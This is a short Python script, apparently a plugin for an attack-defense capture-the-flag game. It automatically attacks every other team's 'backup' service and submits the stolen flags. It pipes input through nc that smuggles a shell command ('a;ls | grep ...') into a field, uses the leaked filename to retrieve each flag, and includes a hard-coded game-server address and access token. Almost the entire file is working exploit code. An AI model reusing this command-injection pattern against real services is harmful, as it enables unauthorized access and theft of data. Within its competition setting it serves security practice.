# Attempts to steal flags from all teams (except the test team and
# our own!) for the 'backup' service
def name():
    return "steal-backup-flags"

def help():
    return "Steal flags from the 'backup' service!"

def args():
    return ""

def run(args):
    from re import search
    from subprocess import Popen, PIPE, STDOUT
    import swpag_client

    t = swpag_client.Team("http://34.195.187.175", "f67634a9373be60a439287965e1d8562")
    backup_flags = t.get_targets(1)

    for target in backup_flags:
        team = target['hostname']
        flag_id = target['flag_id']

        if team in ["team9", "team11", "team12"]:
            print("Skipping {0}".format(team))
            continue

        print("Trying {0}...".format(team))

        p = Popen(["nc", team, "10001"], stdout=PIPE, stdin=PIPE)
        out = str(p.communicate(input="2\na;ls | grep {0};\n\n\n".format(flag_id).encode()))
        m = search("\w{20}_(\w{20})", out)

        if m == None:
            continue

        p = Popen(["nc", team, "10001"], stdout=PIPE, stdin=PIPE)
        out = str(p.communicate(input="2\n{0}\n{1}\n\n\n".format(flag_id, m.group(1)).encode()))
        m = search("(FLG\w+)Hello", out)

        if m == None:
            continue

        result = t.submit_flag([m.group(1)])

        print("Submitting flag {0} for team {1}: {2}".format(m.group(1), team, result))